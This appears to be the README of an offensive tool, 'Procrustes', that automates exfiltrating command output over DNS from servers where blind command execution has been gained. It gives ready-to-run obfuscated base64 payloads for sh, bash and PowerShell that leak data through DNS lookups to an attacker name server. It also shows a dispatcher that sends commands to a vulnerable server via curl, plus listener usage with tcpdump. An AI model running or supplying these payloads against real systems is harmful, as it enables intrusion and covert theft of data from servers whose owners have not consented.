# Procrustes

A bash script that automates the exfiltration of data over dns in case we have a blind command execution on a server where all outbound connections except DNS are blocked. The script currently supports sh, bash and powershell and is compatible with exec style command execution (e.g. java.lang.Runtime.exec).

<p align="center">
  <img src="images/op.gif"/>
</p>

For its operations, the script takes as input the command we want to run on the target server and transforms it according to the target shell in order to allow its output to be exfiltrated over DNS. After the command is transformed, it's fed to the "dispatcher". The dispatcher is a program provided by the user and is responsible for taking as input a command and have it executed on the target server by any means necessary (e.g. exploiting a vulnerability). After the command is executed on the target server, it is expected to trigger DNS requests to our DNS name server containing chunks of our data. The script listens for those requests until the output of the user provided command is fully exfiltrated.

Below are the supported command transformations, generated for the exfiltration of the command: `ls`

sh:
```bash
sh -c $@|base64${IFS}-d|sh . echo IGRpZyBAMCArdHJpZXM9NSBgKGxzKXxiYXNlNjQgLXcwfHdjIC1jYC5sZW4xNjAzNTQxMTc4LndoYXRldi5lcgo=
```

bash:
```bash
bash -c {echo,IG5zbG9va3VwIGAobHMpfGJhc2U2NCAtdzB8d2MgLWNgLmxlbi4xNjAzMDMwNTYwLndoYXRldi5lcgo=}|{base64,-d}|bash
```

powershell:
```bash
powershell -enc UgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAkACgAIgB7ADAAfQAuAHsAMQB9AC4AewAyAH0AIgAgAC0AZgAgACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAoAGwAcwApACkAKQAuAGwAZQBuAGcAdABoACkALAAiAGwAZQBuACIALAAiADEANgAwADMAMAAzADAANAA4ADgALgB3AGgAYQB0AGUAdgAuAGUAcgAiACkACgA=
```

## Usage
1. Local testing for bash:
```bash
./prokroustes_chunked.sh -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret' < <(stdbuf -oL tcpdump --immediate -l -i any udp port 53)
```

Contents of local_bash.sh:
> $@

2. Local testing for powershell with WSL2:
```bash
stdbuf -oL tcpdump --immediate -l -i any udp port 53|./prokroustes_chunked.sh -w ps -h whatev.er -d "Resolve-DnsName -Server wsl2_IP -Name" -x dispatcher_examples/local_powershell_wsl2.sh -- 'gci | % {$_.Name}'
```

Contents of local_powershell_wsl2.sh:
> /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe ${@:1}

3. powershell example where we ssh into our NS to get the incoming DNS requests.
```bash
./prokroustes_chunked.sh -w ps -h yourdns.ns -d "Resolve-DnsName" -x ./dispatcher.sh -- 'gci | % {$_.Name}' < <(stdbuf -oL ssh user@HOST 'sudo tcpdump --immediate -l udp port 53')
```

Contents of dispatcher.sh
> curl https://vulnerable_server --data-urlencode "cmd=${1}"

4. More information on the options
```bash
./prokroustes_chunked.sh --help
```

### Comparison

|                       | prokroustes_chunked                | prokroustis_full  |
| -------------         |:-------------:               |:-----:         |
| payload size overhead (sh/powershell) | 160\*NLABELS/500\*NLABELS                      | 315/740        |
| dispatcher calls #     | #output/(LABEL_SIZE*NLABELS)[1] |   1👌          |
| speed (sh/powershell)                | ✔/✔                         |  ✔/😔         |

[1] On prokroustes_chunked, the provided command gets executed multiple times on the server until all of its output is extracted. This behavior may cause problems in case that command is not idempotent (functionality or output-wise) or is time/resource intensive. 
A workaround to avoid running into issues for the aforementioned cases is to first store the command output into a file (e.g. /tmp/file) and then read that file.

### Todos
 - prokroustes_full's powershell command can use some parallelization